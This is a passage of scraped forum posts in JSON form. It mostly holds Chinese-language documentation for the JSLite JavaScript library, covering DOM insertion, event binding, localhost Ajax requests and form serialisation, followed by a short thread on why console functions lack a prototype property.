self</span>\n</pre></div>\n\n<h3>insertAfter</h3>\n\n<p>insertAfter(selector)   ⇒ self&lt;br&gt;<br>\n插入的对象集合中的元素到指定的每个元素后面的dom中。这个有点像 after，但是使用方式相反。</p>\n<div class=\"highlight\"><pre><span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"s1\">'&lt;p&gt;test&lt;/p&gt;'</span><span class=\"p\">).</span><span class=\"nx\">insertAfter</span><span class=\"p\">(</span><span class=\"s1\">'#box'</span><span class=\"p\">)</span> <span class=\"c1\">//⇒ self</span>\n<span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"s1\">'#input'</span><span class=\"p\">).</span><span class=\"nx\">insertAfter</span><span class=\"p\">(</span><span class=\"s1\">'#box'</span><span class=\"p\">)</span>        <span class=\"c1\">//⇒ self  $('#input')</span>\n</pre></div>\n\n<h3>before</h3>\n\n<p>插入到标签开始前。</p>\n<div class=\"highlight\"><pre><span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"s2\">\"#box\"</span><span class=\"p\">).</span><span class=\"nx\">before</span><span class=\"p\">(</span><span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"s1\">'input'</span><span class=\"p\">))</span> <span class=\"c1\">//⇒ self</span>\n</pre></div>\n\n<h3>insertBefore</h3>\n\n<p>insertBefore(selector)   ⇒ self&lt;br&gt;<br>\n将生成的内容插入 selector 匹配的节点标签开始前。这个有点像 before，但是使用方式相反。</p>\n<div class=\"highlight\"><pre><span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"s1\">'&lt;p&gt;test&lt;/p&gt;'</span><span class=\"p\">).</span><span class=\"nx\">insertBefore</span><span class=\"p\">(</span><span class=\"s1\">'#box'</span><span class=\"p\">)</span>\n</pre></div>\n\n<hr>\n\n<h2>事件处理</h2>\n\n<p><code>blur</code> <code>focus</code> <code>focusin</code> <code>focusout</code> <code>load</code> <code>resize</code> <code>scroll</code> <code>unload</code> <code>click</code> <code>dblclick</code> <code>mousedown</code> <code>mouseup</code> <code>mousemove</code> <code>mouseover</code> <code>mouseout</code> <code>mouseenter</code> <code>mouseleave</code> <code>change</code> <code>select</code> <code>submit</code> <code>keydown</code> <code>keypress</code> <code>keyup</code> <code>error</code> 对象上直接添加事件。</p>\n<div class=\"highlight\"><pre><span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"s2\">\"#box\"</span><span class=\"p\">).</span><span class=\"nx\">click</span><span class=\"p\">(</span><span class=\"kd\">function</span><span class=\"p\">(){</span>\n    <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"s2\">\"绑定点击事件\"</span><span class=\"p\">)</span>\n<span class=\"p\">});</span>\n</pre></div>\n\n<h3>ready</h3>\n\n<p>ready(function($){ ... })   ⇒ self&lt;br&gt;<br>\n添加一个事件侦听器，当页面 <code>dom</code> 加载完毕 <code>DOMContentLoaded</code> 事件触发时触发。加载完毕执行，建议使用 <code>$(func)</code> 来代替这种用法。</p>\n<div class=\"highlight\"><pre><span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"nb\">document</span><span class=\"p\">).</span><span class=\"nx\">ready</span><span class=\"p\">(</span><span class=\"kd\">function</span><span class=\"p\">(){</span>\n    <span class=\"nx\">alert</span><span class=\"p\">(</span><span class=\"s2\">\"当页面dom加载完毕执行\"</span><span class=\"p\">);</span>\n    <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"nx\">$$</span><span class=\"p\">(</span><span class=\"s2\">\"#box\"</span><span class=\"p\">));</span>\n<span class=\"p\">})</span>\n</pre></div>\n\n<h3>$(func)</h3>\n\n<p>加载完毕执行。与 <code>ready</code> 方法相同</p>\n<div class=\"highlight\"><pre><span class=\"c1\">//或者使用下面方法代替ready</span>\n<span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"kd\">function</span><span class=\"p\">(){</span>\n    <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"s2\">\"当页面dom加载完毕执行\"</span><span class=\"p\">);</span>\n<span class=\"p\">})</span>\n</pre></div>\n\n<h3>bind</h3>\n\n<p>为每个匹配元素的特定事件绑定事件处理函数。可以绑定这些事件 <code>blur</code> <code>focus</code> <code>focusin</code> <code>focusout</code> <code>load</code> <code>resize</code> <code>scroll</code> <code>unload</code> <code>click</code> <code>dblclick</code> <code>mousedown</code> <code>mouseup</code> <code>mousemove</code> <code>mouseover</code> <code>mouseout</code> <code>mouseenter</code> <code>mouseleave</code> <code>change</code> <code>select</code> <code>submit</code> <code>keydown</code> <code>keypress</code> <code>keyup</code> <code>error</code>。</p>\n<div class=\"highlight\"><pre><span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"s2\">\"#box\"</span><span class=\"p\">).</span><span class=\"nx\">bind</span><span class=\"p\">(</span><span class=\"s2\">\"click\"</span><span class=\"p\">,</span> <span class=\"kd\">function</span><span class=\"p\">(){</span>\n    <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"s2\">\"绑定点击事件\"</span><span class=\"p\">)</span>\n<span class=\"p\">});</span>\n</pre></div>\n\n<h3>unbind</h3>\n\n<p>解除绑定事件，从每一个匹配的节点对象中删除绑定的事件。</p>\n<div class=\"highlight\"><pre><span class=\"kd\">var</span> <span class=\"nx\">f1</span><span class=\"o\">=</span><span class=\"kd\">function</span><span class=\"p\">(){</span><span class=\"nx\">alert</span><span class=\"p\">(</span><span class=\"s1\">'41'</span><span class=\"p\">);}</span>\n<span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"s2\">\"#box\"</span><span class=\"p\">).</span><span class=\"nx\">bind</span><span class=\"p\">(</span><span class=\"s2\">\"click\"</span><span class=\"p\">,</span><span class=\"nx\">f1</span><span class=\"p\">)</span>   <span class=\"c1\">//⇒ 绑定事件</span>\n<span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"s2\">\"#box\"</span><span class=\"p\">).</span><span class=\"nx\">unbind</span><span class=\"p\">(</span><span class=\"s2\">\"click\"</span><span class=\"p\">,</span><span class=\"nx\">f1</span><span class=\"p\">)</span> <span class=\"c1\">//⇒ 解除绑定事件</span>\n\n<span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"s2\">\"#box\"</span><span class=\"p\">).</span><span class=\"nx\">bind</span><span class=\"p\">(</span><span class=\"s2\">\"click\"</span><span class=\"p\">,</span><span class=\"kd\">function</span><span class=\"p\">(){</span><span class=\"nx\">alert</span><span class=\"p\">(</span><span class=\"s1\">'41'</span><span class=\"p\">);})</span>   <span class=\"c1\">//⇒ 绑定事件</span>\n<span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"s2\">\"#box\"</span><span class=\"p\">).</span><span class=\"nx\">unbind</span><span class=\"p\">(</span><span class=\"s2\">\"click\"</span><span class=\"p\">,</span><span class=\"kd\">function</span><span class=\"p\">(){</span><span class=\"nx\">alert</span><span class=\"p\">(</span><span class=\"s1\">'41'</span><span class=\"p\">);})</span> <span class=\"c1\">//⇒ 解除绑定事件</span>\n</pre></div>\n\n<h3>on</h3>\n\n<p>为每个匹配元素的特定事件绑定事件处理函数。可以绑定这些事件 <code>blur</code> <code>focus</code> <code>focusin</code> <code>focusout</code> <code>load</code> <code>resize</code> <code>scroll</code> <code>unload</code> <code>click</code> <code>dblclick</code> <code>mousedown</code> <code>mouseup</code> <code>mousemove</code> <code>mouseover</code> <code>mouseout</code> <code>mouseenter</code> <code>mouseleave</code> <code>change</code> <code>select</code> <code>submit</code> <code>keydown</code> <code>keypress</code> <code>keyup</code> <code>error</code>。</p>\n<div class=\"highlight\"><pre><span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"s2\">\"#box\"</span><span class=\"p\">).</span><span class=\"nx\">on</span><span class=\"p\">(</span><span class=\"s2\">\"click\"</span><span class=\"p\">,</span> <span class=\"kd\">function</span><span class=\"p\">(){</span>\n    <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"s2\">\"绑定点击事件\"</span><span class=\"p\">)</span>\n<span class=\"p\">});</span>\n\n<span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"s2\">\"#box\"</span><span class=\"p\">).</span><span class=\"nx\">on</span><span class=\"p\">(</span><span class=\"s1\">'click mouseup'</span><span class=\"p\">,</span><span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">evn</span><span class=\"p\">,</span><span class=\"nx\">a</span><span class=\"p\">){</span>\n    <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"s1\">'2'</span><span class=\"o\">+</span><span class=\"nx\">a</span><span class=\"p\">)</span>\n<span class=\"p\">})</span> <span class=\"c1\">//⇒ self  绑定两个事件</span>\n</pre></div>\n\n<h3>off</h3>\n\n<p>解除绑定事件，从每一个匹配的节点对象中删除绑定的事件。</p>\n<div class=\"highlight\"><pre><span class=\"kd\">var</span> <span class=\"nx\">f1</span><span class=\"o\">=</span><span class=\"kd\">function</span><span class=\"p\">(){</span><span class=\"nx\">alert</span><span class=\"p\">(</span><span class=\"s1\">'41'</span><span class=\"p\">);}</span>\n<span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"s2\">\"#box\"</span><span class=\"p\">).</span><span class=\"nx\">on</span><span class=\"p\">(</span><span class=\"s2\">\"click\"</span><span class=\"p\">,</span><span class=\"nx\">f1</span><span class=\"p\">)</span>   <span class=\"c1\">//⇒ 绑定事件</span>\n<span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"s2\">\"#box\"</span><span class=\"p\">).</span><span class=\"nx\">off</span><span class=\"p\">(</span><span class=\"s2\">\"click\"</span><span class=\"p\">,</span><span class=\"nx\">f1</span><span class=\"p\">)</span> <span class=\"c1\">//⇒ 解除绑定事件</span>\n\n<span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"s2\">\"#box\"</span><span class=\"p\">).</span><span class=\"nx\">on</span><span class=\"p\">(</span><span class=\"s2\">\"click\"</span><span class=\"p\">,</span><span class=\"kd\">function</span><span class=\"p\">(){</span><span class=\"nx\">alert</span><span class=\"p\">(</span><span class=\"s1\">'41'</span><span class=\"p\">);})</span>   <span class=\"c1\">//⇒ 绑定事件</span>\n<span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"s2\">\"#box\"</span><span class=\"p\">).</span><span class=\"nx\">off</span><span class=\"p\">(</span><span class=\"s2\">\"click\"</span><span class=\"p\">,</span><span class=\"kd\">function</span><span class=\"p\">(){</span><span class=\"nx\">alert</span><span class=\"p\">(</span><span class=\"s1\">'41'</span><span class=\"p\">);})</span> <span class=\"c1\">//⇒ 解除绑定事件</span>\n</pre></div>\n\n<h3>trigger</h3>\n\n<p>trigger(event, [args])   ⇒ self&lt;br&gt;<br>\n匹配到的节点集合的元素上触发指定的事件。如果给定args参数，它会作为参数传递给事件函数。</p>\n<div class=\"highlight\"><pre><span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"s2\">\"#box\"</span><span class=\"p\">).</span><span class=\"nx\">on</span><span class=\"p\">(</span><span class=\"s1\">'abc:click'</span><span class=\"p\">,</span><span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">evn</span><span class=\"p\">,</span><span class=\"nx\">a</span><span class=\"p\">,</span><span class=\"nx\">c</span><span class=\"p\">){</span>\n    <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"s1\">'2'</span><span class=\"o\">+</span><span class=\"nx\">a</span><span class=\"o\">+</span><span class=\"nx\">c</span><span class=\"p\">)</span>\n<span class=\"p\">})</span> <span class=\"c1\">//⇒ self  绑定一个事件</span>\n<span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"s2\">\"#box\"</span><span class=\"p\">).</span><span class=\"nx\">trigger</span><span class=\"p\">(</span><span class=\"s1\">'abc:click'</span><span class=\"p\">,[</span><span class=\"s1\">'wwww'</span><span class=\"p\">])</span> <span class=\"c1\">//⇒ self 触发并传一个参数进去</span>\n</pre></div>\n\n<hr>\n\n<h2>Ajax</h2>\n\n<p>执行Ajax请求。&lt;br&gt;</p>\n\n<p>type：请求方法 (\"GET\", \"POST\")&lt;br&gt;<br>\ndata：(默认：none)&lt;br&gt;发送到服务器的数据；如果是get请求，它会自动被作为参数拼接到url上。非String对象&lt;br&gt;<br>\ndataType：(<code>json</code>, <code>jsonp</code>, <code>xml</code>, <code>html</code>, or <code>text</code>)&lt;br&gt;<br>\ncontentType：一个额外的\"{键:值}\"对映射到请求一起发送&lt;br&gt;<br>\nheaders：(默认：{})： 一个额外的\"{键:值}\"对映射到请求一起发送&lt;br&gt;<br>\nurl：发送请求的地址&lt;br&gt;<br>\nasync：此参数不传默认为true(同步请求)，false异步请求&lt;br&gt;<br>\nsuccess(cdata)：请求成功之后调用。传入返回后的数据，以及包含成功代码的字符串。&lt;br&gt;<br>\nerror(status, statusText)：请求出错时调用。 (超时，解析错误，或者状态码不在HTTP 2xx)。</p>\n\n<h3>ajax get</h3>\n<div class=\"highlight\"><pre><span class=\"nx\">$</span><span class=\"p\">.</span><span class=\"nx\">get</span><span class=\"p\">(</span><span class=\"s1\">'http://127.0.0.1/api.php?wcj=123'</span><span class=\"p\">,</span> \n<span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">cdata</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n    <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"s1\">'ok'</span><span class=\"p\">,</span> <span class=\"nx\">cdata</span><span class=\"p\">)</span>\n<span class=\"p\">})</span>\n</pre></div>\n\n<h3>ajax GET请求</h3>\n<div class=\"highlight\"><pre><span class=\"nx\">$</span><span class=\"p\">.</span><span class=\"nx\">ajax</span><span class=\"p\">(</span><span class=\"s1\">'GET'</span><span class=\"p\">,</span> <span class=\"s1\">'http://127.0.0.1/api.php'</span><span class=\"p\">,</span> <span class=\"p\">{</span><span class=\"s2\">\"wcj\"</span><span class=\"o\">:</span><span class=\"s2\">\"123\"</span><span class=\"p\">,</span><span class=\"s2\">\"ok\"</span><span class=\"o\">:</span><span class=\"s1\">'11'</span><span class=\"p\">},</span>\n<span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">cdata</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n    <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"s1\">'ok'</span><span class=\"p\">,</span> <span class=\"nx\">cdata</span><span class=\"p\">)</span>\n<span class=\"p\">})</span>\n\n<span class=\"nx\">$</span><span class=\"p\">.</span><span class=\"nx\">ajax</span><span class=\"p\">(</span><span class=\"s1\">'GET'</span><span class=\"p\">,</span> <span class=\"s1\">'http://127.0.0.1/api.php?wcj=abc'</span><span class=\"p\">,</span> \n<span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">cdata</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n    <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"s1\">'ok'</span><span class=\"p\">,</span> <span class=\"nx\">cdata</span><span class=\"p\">)</span>\n<span class=\"p\">})</span>\n\n<span class=\"nx\">$</span><span class=\"p\">.</span><span class=\"nx\">ajax</span><span class=\"p\">({</span>\n    <span class=\"nx\">type</span><span class=\"o\">:</span><span class=\"s1\">'GET'</span><span class=\"p\">,</span>\n    <span class=\"nx\">dataType</span><span class=\"o\">:</span><span class=\"s1\">'json'</span><span class=\"p\">,</span>\n    <span class=\"nx\">data</span><span class=\"o\">:</span><span class=\"p\">{</span><span class=\"s1\">'nike'</span><span class=\"o\">:</span><span class=\"s1\">'a'</span><span class=\"p\">},</span>\n    <span class=\"nx\">url</span><span class=\"o\">:</span><span class=\"s1\">'http://127.0.0.1/api.php'</span><span class=\"p\">,</span>\n    <span class=\"nx\">success</span><span class=\"o\">:</span><span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">data</span><span class=\"p\">){</span>\n       <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"s1\">'success:'</span><span class=\"p\">,</span><span class=\"nx\">data</span><span class=\"p\">)</span>\n    <span class=\"p\">},</span>\n    <span class=\"nx\">error</span><span class=\"o\">:</span><span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">d</span><span class=\"p\">){</span>\n       <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"s1\">'error:'</span><span class=\"p\">,</span><span class=\"nx\">d</span><span class=\"p\">)</span>\n    <span class=\"p\">}</span>\n<span class=\"p\">})</span>\n</pre></div>\n\n<h3>ajax post</h3>\n<div class=\"highlight\"><pre><span class=\"nx\">$</span><span class=\"p\">.</span><span class=\"nx\">post</span><span class=\"p\">(</span><span class=\"s1\">'http://127.0.0.1/api.php'</span><span class=\"p\">,</span> <span class=\"p\">{</span><span class=\"s1\">'nike'</span><span class=\"o\">:</span><span class=\"mi\">0</span><span class=\"p\">},</span>\n<span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">cdata</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n    <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"s1\">'ok'</span><span class=\"p\">,</span> <span class=\"nx\">cdata</span><span class=\"p\">)</span>\n<span class=\"p\">})</span>\n</pre></div>\n\n<h3>ajax POST请求</h3>\n<div class=\"highlight\"><pre><span class=\"kd\">var</span> <span class=\"nx\">data</span> <span class=\"o\">=</span> <span class=\"p\">{</span> <span class=\"s1\">'key'</span><span class=\"o\">:</span> <span class=\"s1\">'key'</span><span class=\"p\">,</span> <span class=\"s1\">'from'</span><span class=\"o\">:</span> <span class=\"s1\">'from'</span><span class=\"p\">}</span>\n<span class=\"nx\">$</span><span class=\"p\">.</span><span class=\"nx\">ajax</span><span class=\"p\">(</span><span class=\"s1\">'POST'</span><span class=\"p\">,</span> <span class=\"s1\">'http://127.0.0.1/api.php'</span><span class=\"p\">,</span> <span class=\"nx\">data</span><span class=\"p\">,</span>\n<span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">data</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n    <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"s1\">'ok'</span><span class=\"p\">,</span> <span class=\"nx\">data</span><span class=\"p\">)</span>\n<span class=\"p\">},</span><span class=\"s1\">'json'</span><span class=\"p\">)</span>\n\n<span class=\"nx\">$</span><span class=\"p\">.</span><span class=\"nx\">ajax</span><span class=\"p\">({</span>\n    <span class=\"nx\">type</span><span class=\"o\">:</span><span class=\"s1\">'POST'</span><span class=\"p\">,</span>\n    <span class=\"nx\">dataType</span><span class=\"o\">:</span><span class=\"s1\">'json'</span><span class=\"p\">,</span>\n    <span class=\"nx\">data</span><span class=\"o\">:</span><span class=\"p\">{</span><span class=\"s2\">\"nike\"</span><span class=\"o\">:</span><span class=\"s2\">\"123\"</span><span class=\"p\">,</span><span class=\"s2\">\"kacper\"</span><span class=\"o\">:</span><span class=\"p\">{</span><span class=\"s2\">\"go\"</span><span class=\"o\">:</span><span class=\"mi\">34</span><span class=\"p\">,</span><span class=\"s2\">\"to\"</span><span class=\"o\">:</span><span class=\"mi\">100</span><span class=\"p\">}},</span>\n    <span class=\"nx\">url</span><span class=\"o\">:</span><span class=\"s1\">'http://127.0.0.1/api.php'</span><span class=\"p\">,</span>\n    <span class=\"nx\">success</span><span class=\"o\">:</span><span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">data</span><span class=\"p\">){</span>\n       <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"s1\">'success:'</span><span class=\"p\">,</span><span class=\"nx\">data</span><span class=\"p\">)</span>\n    <span class=\"p\">},</span>\n    <span class=\"nx\">error</span><span class=\"o\">:</span><span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">d</span><span class=\"p\">){</span>\n       <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"s1\">'error:'</span><span class=\"p\">,</span><span class=\"nx\">d</span><span class=\"p\">)</span>\n    <span class=\"p\">}</span>\n<span class=\"p\">})</span>\n<span class=\"nx\">$</span><span class=\"p\">.</span><span class=\"nx\">ajax</span><span class=\"p\">({</span>\n    <span class=\"nx\">type</span><span class=\"o\">:</span><span class=\"s1\">'POST'</span><span class=\"p\">,</span>\n    <span class=\"nx\">dataType</span><span class=\"o\">:</span><span class=\"s1\">'json'</span><span class=\"p\">,</span>\n    <span class=\"nx\">data</span><span class=\"o\">:</span><span class=\"nx\">JSON</span><span class=\"p\">.</span><span class=\"nx\">stringify</span><span class=\"p\">(</span><span class=\"s1\">'{\"nike\":\"123\",\"kacper\":{\"go\":34,\"to\":100}}'</span><span class=\"p\">),</span>\n    <span class=\"nx\">url</span><span class=\"o\">:</span><span class=\"s1\">'http://127.0.0.1/api.php'</span><span class=\"p\">,</span>\n    <span class=\"nx\">success</span><span class=\"o\">:</span><span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">data</span><span class=\"p\">){</span>\n       <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"s1\">'success:'</span><span class=\"p\">,</span><span class=\"nx\">data</span><span class=\"p\">)</span>\n    <span class=\"p\">},</span>\n    <span class=\"nx\">error</span><span class=\"o\">:</span><span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">d</span><span class=\"p\">){</span>\n       <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"s1\">'error:'</span><span class=\"p\">,</span><span class=\"nx\">d</span><span class=\"p\">)</span>\n    <span class=\"p\">}</span>\n<span class=\"p\">})</span>\n\n<span class=\"nx\">$</span><span class=\"p\">.</span><span class=\"nx\">ajax</span><span class=\"p\">({</span>\n    <span class=\"nx\">type</span><span class=\"o\">:</span><span class=\"s1\">'POST'</span><span class=\"p\">,</span>\n    <span class=\"nx\">dataType</span><span class=\"o\">:</span><span class=\"s1\">'json'</span><span class=\"p\">,</span>\n    <span class=\"nx\">data</span><span class=\"o\">:</span><span class=\"nx\">JSON</span><span class=\"p\">.</span><span class=\"nx\">stringify</span><span class=\"p\">({</span><span class=\"s1\">'nike'</span><span class=\"o\">:</span><span class=\"s1\">'a'</span><span class=\"p\">}),</span>\n    <span class=\"nx\">url</span><span class=\"o\">:</span><span class=\"s1\">'http://127.0.0.1/api.php'</span><span class=\"p\">,</span>\n    <span class=\"nx\">success</span><span class=\"o\">:</span><span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">data</span><span class=\"p\">){</span>\n       <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"s1\">'success:'</span><span class=\"p\">,</span><span class=\"nx\">data</span><span class=\"p\">)</span>\n    <span class=\"p\">},</span>\n    <span class=\"nx\">error</span><span class=\"o\">:</span><span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">d</span><span class=\"p\">){</span>\n       <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"s1\">'error:'</span><span class=\"p\">,</span><span class=\"nx\">d</span><span class=\"p\">)</span>\n    <span class=\"p\">}</span>\n<span class=\"p\">})</span>\n\n<span class=\"nx\">$</span><span class=\"p\">.</span><span class=\"nx\">ajax</span><span class=\"p\">({</span>\n    <span class=\"nx\">type</span><span class=\"o\">:</span><span class=\"s1\">'POST'</span><span class=\"p\">,</span>\n    <span class=\"nx\">data</span><span class=\"o\">:</span><span class=\"p\">{</span><span class=\"s1\">'nike'</span><span class=\"o\">:</span><span class=\"s1\">'a'</span><span class=\"p\">},</span>\n    <span class=\"nx\">url</span><span class=\"o\">:</span><span class=\"s1\">'http://127.0.0.1/api.php'</span><span class=\"p\">,</span>\n    <span class=\"nx\">success</span><span class=\"o\">:</span><span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">data</span><span class=\"p\">){</span>\n       <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"s1\">'success:'</span><span class=\"p\">,</span><span class=\"nx\">data</span><span class=\"p\">)</span>\n    <span class=\"p\">},</span>\n    <span class=\"nx\">error</span><span class=\"o\">:</span><span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">d</span><span class=\"p\">){</span>\n       <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"s1\">'error:'</span><span class=\"p\">,</span><span class=\"nx\">d</span><span class=\"p\">)</span>\n    <span class=\"p\">}</span>\n<span class=\"p\">})</span>\n\n<span class=\"nx\">$</span><span class=\"p\">.</span><span class=\"nx\">ajax</span><span class=\"p\">({</span>\n    <span class=\"nx\">type</span><span class=\"o\">:</span><span class=\"s1\">'POST'</span><span class=\"p\">,</span>\n    <span class=\"nx\">dataType</span><span class=\"o\">:</span><span class=\"s1\">'json'</span><span class=\"p\">,</span>\n    <span class=\"nx\">data</span><span class=\"o\">:</span><span class=\"p\">{</span><span class=\"s1\">'nike'</span><span class=\"o\">:</span><span class=\"s1\">'a'</span><span class=\"p\">},</span>\n    <span class=\"nx\">url</span><span class=\"o\">:</span><span class=\"s1\">'http://127.0.0.1/api.php'</span><span class=\"p\">,</span>\n    <span class=\"nx\">success</span><span class=\"o\">:</span><span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">data</span><span class=\"p\">){</span>\n       <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"s1\">'success:'</span><span class=\"p\">,</span><span class=\"nx\">data</span><span class=\"p\">)</span>\n    <span class=\"p\">},</span>\n    <span class=\"nx\">error</span><span class=\"o\">:</span><span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">d</span><span class=\"p\">){</span>\n       <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"s1\">'error:'</span><span class=\"p\">,</span><span class=\"nx\">d</span><span class=\"p\">)</span>\n    <span class=\"p\">},</span>\n    <span class=\"nx\">headers</span><span class=\"o\">:</span> <span class=\"p\">{</span>\n        <span class=\"s2\">\"Access-Control-Allow-Origin\"</span><span class=\"o\">:</span><span class=\"s2\">\"http://pc175.com\"</span><span class=\"p\">,</span>\n        <span class=\"s2\">\"Access-Control-Allow-Headers\"</span><span class=\"o\">:</span><span class=\"s2\">\"X-Requested-With\"</span>\n    <span class=\"p\">},</span>\n    <span class=\"nx\">contentType</span><span class=\"o\">:</span> <span class=\"s1\">'application/json'</span>\n<span class=\"p\">})</span>\n</pre></div>\n\n<hr>\n\n<h2>Form</h2>\n\n<p>表单提交的一些方法</p>\n\n<h3>serializeArray</h3>\n\n<p>将用作提交的表单元素的值组合成拥有name和value的键值对组成的数组。不能使用的表单元素，buttons，未选中的radio buttons/checkboxs 将会被跳过。结果不包含file inputs的数据。</p>\n<div class=\"highlight\"><pre><span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"s1\">'form'</span><span class=\"p\">).</span><span class=\"nx\">serializeArray</span><span class=\"p\">();</span>\n<span class=\"c1\">//=&gt; [{\"name\":\"golang\",\"value\":\"456\"},{\"name\":\"name\",\"value\":\"\"},{\"name\":\"password\",\"value\":\"\"},{\"name\":\"sel\",\"value\":[]},{\"name\":\"kaikai\",\"value\":\"\"},{\"name\":\"w\",\"value\":\"\"},{\"name\":\"w\",\"value\":\"\"}]</span>\n</pre></div>\n\n<h3>serialize</h3>\n\n<p>将表单元素数组或者对象序列化。</p>\n<div class=\"highlight\"><pre><span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"s1\">'form'</span><span class=\"p\">).</span><span class=\"nx\">serialize</span><span class=\"p\">();</span>\n<span class=\"c1\">//=&gt; golang=456&amp;name=&amp;password=&amp;sel=&amp;kaikai=&amp;w=asd&amp;w2=asdf</span>\n</pre></div>\n</div></div>"], "reply": "2", "tittle": "JSLite 一起弄一个我们自己的前端库", "comment": ["我想问的是,楼主写文档的时候,头大么?里面这么多标签,赶脚如果用Sublime会很头大,楼主用的啥编辑器写文档的?", "Sublime  安装了很多插件，方便快速定位标签，而且还有说明文档的哦。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><img src=\"http://img.itc.cn/photo/j3UgzKr8JEc\" alt=\"\"><br>\n不是说所有函数都有prototype属性的么:(</p>\n</div></div>"], "reply": "4", "tittle": "为何有些 JS 函数没有 prototype 属性?", "comment": ["typeof console == 'object'", " \r", "\r", "为何console.info函数无法扩展,看下图\r", "> console.__proto__\r", "{ log: [Function],\r", "  info: [Function],\r", "  warn: [Function],\r", "  error: [Function],\r", "  dir: [Function],\r", "  time: [Function],\r", "  timeEnd: [Function],\r", "  trace: [Function],\r", "  assert: [Function] }\r", "\r", "> console.__proto__.test = function() {this.log.apply(this, arguments);}\r", "[Function]\r", "\r", "> console.test(123)\r", "123\r", "undefined", " \r", "\r", "你的问题是console为什么没有prototype还是想要扩充console？\r", "\r", "如果是前者，那么console是个object，所以无prototype属性，但是你可以通过__proto__来查看它的内部原型引用。\r", "\r", ",console-wx34am62o7z3airhx2m9x8b0izbo7p21ccx4h.test\">而如果是后者，可采用@", 